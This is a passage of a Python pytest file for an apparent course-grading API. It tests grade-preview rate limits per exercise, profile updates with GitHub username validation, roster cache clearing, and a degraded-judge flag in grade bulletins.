    sheets = FakeSheets(previews_rows=rows)
    _patch_endpoints(patches, exercise=_exercise_with_perguntas(num=1), sheets=sheets)
    monkeypatch.setattr(
        endpoints_module,
        "grade_respostas",
        lambda items: [GeminiResult(nota=10, feedback="ok", ok=True) for _ in items],
    )
    response = await _post(
        _make_app(),
        "/grade-preview",
        {
            "exercicio": "1.1",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "respostas": ["x"],
        },
    )
    assert response.status_code == 200
    # Mesmo bypassando, ainda registra na tab pra audit
    assert len(sheets.appended_previews) == 1


@pytest.mark.asyncio
async def test_grade_preview_rate_limit_isolated_per_exercise(patches, monkeypatch) -> None:
    """Cap é por exercício — 3 previews do 1.1 não bloqueiam 1.2."""
    rows = [["header"] * 3]
    for hours_ago in (1, 2, 3):
        ts = (NOW - timedelta(hours=hours_ago)).isoformat()
        rows.append([ts, EMAIL, "1.1"])  # tudo no 1.1
    sheets = FakeSheets(previews_rows=rows)
    # exercise é 1.2 (não 1.1), perguntas presentes
    ex_12 = _exercise_with_perguntas(num=1)
    ex_12 = Exercise(
        id="1.2",
        titulo=ex_12.titulo,
        turmas=ex_12.turmas,
        disponivel_a_partir_de=ex_12.disponivel_a_partir_de,
        prazo=ex_12.prazo,
        criterios=ex_12.criterios,
        perguntas=ex_12.perguntas,
    )
    _patch_endpoints(patches, exercise=ex_12, sheets=sheets)
    monkeypatch.setattr(
        endpoints_module,
        "grade_respostas",
        lambda items: [GeminiResult(nota=5, feedback="ok", ok=True) for _ in items],
    )
    response = await _post(
        _make_app(),
        "/grade-preview",
        {
            "exercicio": "1.2",
            "repo_url": f"https://github.com/{GITHUB_USERNAME}/projeto",
            "respostas": ["resposta 1.2"],
        },
    )
    assert response.status_code == 200
    assert len(sheets.appended_previews) == 1


# ---------- POST /me/profile (US-03) ----------


@dataclass
class FakeRosterWriter:
    result: Any = None
    calls: list[tuple[str, str, str]] = None  # type: ignore[assignment]

    def __post_init__(self) -> None:
        self.calls = []

    def update_profile(self, email: str, nome: str, github_username: str) -> Any:
        self.calls.append((email, nome, github_username))
        return self.result


def _patch_roster_writer(monkeypatch, fake: FakeRosterWriter) -> None:
    monkeypatch.setattr(endpoints_module, "get_roster_writer", lambda: fake)
    monkeypatch.setenv("ROSTER_SHEET_ID", "roster-sheet-xyz")


@pytest.mark.asyncio
async def test_me_profile_updates_both_fields(patches) -> None:
    from app.roster_writer import ProfileUpdateResult

    fake = FakeRosterWriter(
        result=ProfileUpdateResult(updated=["nome", "github_username"], skipped=[])
    )
    _patch_roster_writer(patches, fake)
    response = await _post(
        _make_app(),
        "/me/profile",
        {"nome": "Foo Bar", "github_username": "foo-bar"},
    )
    assert response.status_code == 200
    assert response.json() == {"updated": ["nome", "github_username"], "skipped": []}
    assert fake.calls == [(EMAIL, "Foo Bar", "foo-bar")]


@pytest.mark.asyncio
async def test_me_profile_both_already_set(patches) -> None:
    from app.roster_writer import ProfileUpdateResult

    fake = FakeRosterWriter(
        result=ProfileUpdateResult(updated=[], skipped=["nome", "github_username"])
    )
    _patch_roster_writer(patches, fake)
    response = await _post(
        _make_app(),
        "/me/profile",
        {"nome": "Foo Bar", "github_username": "foo-bar"},
    )
    assert response.status_code == 200
    assert response.json() == {"updated": [], "skipped": ["nome", "github_username"]}


@pytest.mark.asyncio
async def test_me_profile_only_one_field_updated(patches) -> None:
    from app.roster_writer import ProfileUpdateResult

    fake = FakeRosterWriter(
        result=ProfileUpdateResult(updated=["github_username"], skipped=["nome"])
    )
    _patch_roster_writer(patches, fake)
    response = await _post(
        _make_app(),
        "/me/profile",
        {"nome": "Foo Bar", "github_username": "foo-bar"},
    )
    assert response.status_code == 200
    assert response.json() == {"updated": ["github_username"], "skipped": ["nome"]}


@pytest.mark.parametrize(
    "bad_username",
    [
        "foo bar",  # contém espaço
        "",  # vazio
        "a" * 40,  # > 39 chars
        "-foo",  # começa com hífen
        "foo-",  # termina com hífen
        "foo--bar",  # hífens consecutivos
        "a--b",  # hífens consecutivos curto
    ],
)
@pytest.mark.asyncio
async def test_me_profile_invalid_github_username_returns_400(
    patches, bad_username
) -> None:
    from app.roster_writer import ProfileUpdateResult

    fake = FakeRosterWriter(result=ProfileUpdateResult(updated=[], skipped=[]))
    _patch_roster_writer(patches, fake)
    response = await _post(
        _make_app(),
        "/me/profile",
        {"nome": "Foo", "github_username": bad_username},
    )
    assert response.status_code == 400
    assert response.json() == {"error": "invalid_github_username"}
    # Validação acontece ANTES do RosterWriter — não deve nem chamar.
    assert fake.calls == []


@pytest.mark.asyncio
async def test_me_profile_clears_roster_cache(patches) -> None:
    from app import roster as roster_module_under_test
    from app.roster_writer import ProfileUpdateResult

    fake = FakeRosterWriter(
        result=ProfileUpdateResult(updated=["nome", "github_username"], skipped=[])
    )
    _patch_roster_writer(patches, fake)

    # Popular cache pra verificar que é limpo depois.
    roster_module_under_test._CACHE["http://roster.example/x.csv"] = (123.0, {"a": "b"})
    assert roster_module_under_test._CACHE != {}

    response = await _post(
        _make_app(),
        "/me/profile",
        {"nome": "Foo Bar", "github_username": "foo-bar"},
    )
    assert response.status_code == 200
    assert roster_module_under_test._CACHE == {}


@pytest.mark.asyncio
async def test_me_profile_missing_roster_sheet_config_returns_500(patches) -> None:
    patches.delenv("ROSTER_SHEET_ID", raising=False)
    response = await _post(
        _make_app(),
        "/me/profile",
        {"nome": "Foo Bar", "github_username": "foo-bar"},
    )
    assert response.status_code == 500
    assert response.json() == {"error": "missing_roster_sheet_config"}


# ---------- _bulletin_to_dict: flag judge_degraded -------------------------


def test_bulletin_to_dict_flags_judge_degraded_true() -> None:
    from app.grader import Bulletin

    b = Bulletin(
        criterios=(
            CriterioResult(True, 10, 10, "ok"),
            CriterioResult(True, 20, 20, "[fallback judge]", degraded=True),
        ),
        total=30,
        max_total=30,
    )
    d = endpoints_module._bulletin_to_dict(b)
    assert d["judge_degraded"] is True
    # per-critério também é serializado (asdict inclui degraded)
    assert d["criterios"][1]["degraded"] is True
    assert d["criterios"][0]["degraded"] is False


def test_bulletin_to_dict_judge_degraded_false_when_all_ok() -> None:
    from app.grader import Bulletin

    b = Bulletin(
        criterios=(CriterioResult(True, 10, 10, "ok"),),
        total=10,
        max_total=10,
    )
    d = endpoints_module._bulletin_to_dict(b)
    assert d["judge_degraded"] is False
